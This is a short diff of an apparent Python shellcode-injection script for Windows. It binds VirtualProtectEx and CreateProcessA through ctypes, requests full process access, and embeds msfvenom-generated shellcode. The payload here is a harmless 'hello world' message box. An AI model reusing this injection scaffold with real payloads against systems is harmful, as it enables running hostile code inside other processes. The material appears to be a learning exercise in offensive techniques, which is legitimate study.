@@ -34,8 +34,6 @@ PAGE_READWRITE = 0x04
 EXECUTE_IMMEDIATELY =0x0
 PROCESS_ALL_ACCESS = (0x000F0000 | 0x00100000 | 0x00000FFF)
 
-# IN THIS PROJECT WE USE SOME NEW FUNCTIONS ...
-
 VirtualProtectEx = kernel32.VirtualProtectEx
 VirtualProtectEx.argtypes = (wintypes.HANDLE, wintypes.LPVOID, SIZE_T, wintypes.DWORD, wintypes.LPDWORD)
 VirtualProtectEx.restype = wintypes.BOOL
@@ -76,7 +74,8 @@ CreateProcessA.restype = wintypes.BOOL
 # msfvenom -a x64 -p windows/x64/messagebox TITLE=hello TEXT=world -f py
 # THIS CMD WILL CREATE A SHELL CODE 
 
-buf =  b""
+# BELOW WRITTEN BUF IS A SHELLCODE FOR HELLO WORLD!
+buf =  b""      
 buf += b"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
 buf += b"\x52\x48\x31\xd2\x56\x65\x48\x8b\x52\x60\x48\x8b\x52\x18"
 buf += b"\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d"
